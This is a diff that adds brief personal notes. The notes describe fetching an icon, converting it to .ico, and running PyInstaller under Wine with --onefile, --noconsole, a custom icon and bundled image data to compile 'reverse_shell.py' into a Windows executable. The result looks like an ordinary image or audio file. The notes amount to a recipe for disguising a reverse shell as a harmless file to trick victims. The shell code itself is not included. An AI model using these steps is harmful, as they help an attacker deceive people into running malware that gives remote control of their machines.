@@ -1,0 +1,9 @@
+search a file.. image, audio
+
+iconfinder ---> search a icon with png format
+ico convert ---> convert png to ico file
+
+
+wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole --icon /path/to/icon.ico reverse_shell.py
+
+wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data "/path/to/icon.jpg;." --onefile --noconsole --icon /path/to/icon.ico reverse_shell.py
